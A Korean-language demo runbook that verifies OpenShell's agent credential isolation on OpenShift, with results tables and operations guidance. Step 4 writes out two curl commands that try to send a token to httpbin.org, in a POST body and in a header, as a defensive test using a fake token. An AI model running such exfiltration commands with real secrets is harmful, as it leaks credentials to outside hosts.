# 시나리오 23. 에이전트 자격 증명 격리

> 상태: 검증 완료(2026-11-24, SNO, OpenShift 4.20.46, OpenShell 0.1.9). RHOAI 3.5에서 OpenShell은 Developer Preview이다.

## 기능 설명

- 분류: 에이전트 보안 > 자격 증명 보호 (Developer Preview)
- 사용자는 API 토큰을 프로바이더(provider)로 게이트웨이에 등록하고, 샌드박스에는 프로바이더를 연결만 한다.
- 샌드박스 안의 환경 변수에는 실제 값 대신 `openshell:resolve:env:<ID>_<KEY>` 형식의 자리표시자가 들어간다.
- 프록시는 프로필이 승인한 엔드포인트로 나가는 요청에서만 자리표시자를 실제 값으로 바꾼다. 승인되지 않은 곳으로 자리표시자를 헤더에 실어 보내면 요청을 거부하고 높은 심각도의 탐지 이벤트를 남긴다.

## 사전 준비

- OpenShell 게이트웨이가 설치되어 있어야 한다. 설치 절차는 [시나리오 20. OpenShell 환경 설정](20-openshell-setup.md)을 따른다.
- 게이트웨이에는 기본 프로필이 없으므로(`openshell profile list` → `No profiles found`), 시연자는 프로필 [profile-github-demo.yaml](../harness/openshell/profile-github-demo.yaml)을 등록한다. 이 프로필은 `api.github.com` 읽기 전용, `curl`만 허용한다.
- 시연용 토큰은 가짜 값이어도 된다. 실제 토큰을 쓰면 3)에서 사용자 정보가 반환된다.

```
openshell profile lint -f harness/openshell/profile-github-demo.yaml
openshell profile import -f harness/openshell/profile-github-demo.yaml
GITHUB_TOKEN=ghp_DEMO0000000000000000000000000000fake \
  openshell provider create --name demo-github --type github-demo --credential GITHUB_TOKEN
openshell provider list
```

## 시연 절차

### 1) 프로바이더를 연결한 샌드박스 생성

유출 대상(`httpbin.org`)은 audit 모드로 열어 두어, 요청이 실제로 나가도 무엇이 실렸는지 볼 수 있게 한다([policy-exfil-audit.yaml](../harness/openshell/policy-exfil-audit.yaml)).

```
openshell sandbox create --name sb-cred \
  --from registry.access.redhat.com/ubi9/python-312:latest \
  --policy harness/openshell/policy-exfil-audit.yaml \
  --provider demo-github --no-auto-providers --detach -- sleep infinity
```

### 2) 샌드박스 안에서 토큰 확인

```
openshell sandbox exec -n sb-cred -- sh -c 'echo GITHUB_TOKEN=$GITHUB_TOKEN'
```

### 3) 승인된 목적지 호출

```
openshell sandbox exec -n sb-cred -- sh -c 'curl -sS -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user'
```

### 4) 유출 시도 (본문, 헤더)

```
# (a) 본문에 실어 보내기
openshell sandbox exec -n sb-cred -- sh -c 'curl -sS -X POST https://httpbin.org/post -d "token=$GITHUB_TOKEN"'
# (b) 인증 헤더에 실어 보내기
openshell sandbox exec -n sb-cred -- sh -c 'curl -sS -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://httpbin.org/headers'
```

## 결과 확인

```
openshell logs sb-cred --since 10m | grep OCSF
oc get pod default--sb-cred -n openshell -o json | jq -r '.spec.containers[].env[]?.name'
oc get secrets -n openshell
```

| 확인 항목 | 검증 결과 |
|------|------|
| 샌드박스 안 `$GITHUB_TOKEN` | `openshell:resolve:env:v15880783623099196136_GITHUB_TOKEN` |
| `api.github.com` 호출 | `ALLOWED ... [policy:_provider_demo_github]`, GitHub 응답 401(가짜 토큰) |
| (a) 본문 유출 | 요청은 나갔으나 `httpbin.org`가 받은 값은 자리표시자뿐 |
| (b) 헤더 유출 | HTTP 403 `credential_endpoint_mismatch`, `FINDING:BLOCKED [HIGH] "Provider credential used at an unauthorized endpoint"` |
| 샌드박스 Pod `env` | 토큰 관련 변수 없음 |
| `openshell` 네임스페이스 Secret | 토큰 원문 없음 (게이트웨이가 KEK로 암호화해 저장) |

## 정리

```
openshell sandbox delete sb-cred
openshell provider delete demo-github
openshell profile delete github-demo
```

## 운영 가이드

- 운영자는 에이전트 이미지와 샌드박스 환경 변수에 실제 키를 넣지 않고 프로바이더로만 전달한다.
- 프로필은 [upstream 예제](https://github.com/ai-openshell/openshell/tree/main/providers)를 복사해 사용하되, `binaries`를 실제 이미지의 실행 파일 경로로 바꾼다. `binaries`는 키를 사용할 수 있는 프로세스를 정하는 최소 권한 통제이다.
- 프로바이더는 파일을 샌드박스에 넣지 못한다. 설정 파일이 필요하면 키가 없는 형태로 이미지에 포함한다.
- 실행 중 연결한 프로바이더는 이미 떠 있는 프로세스에 반영되지 않으므로, `openshell sandbox exec`로 새 프로세스를 띄운다.
- `FINDING:BLOCKED [HIGH]` 이벤트는 에이전트 탈취 징후이다. 운영자는 이 이벤트를 SIEM 경보 규칙으로 등록한다.
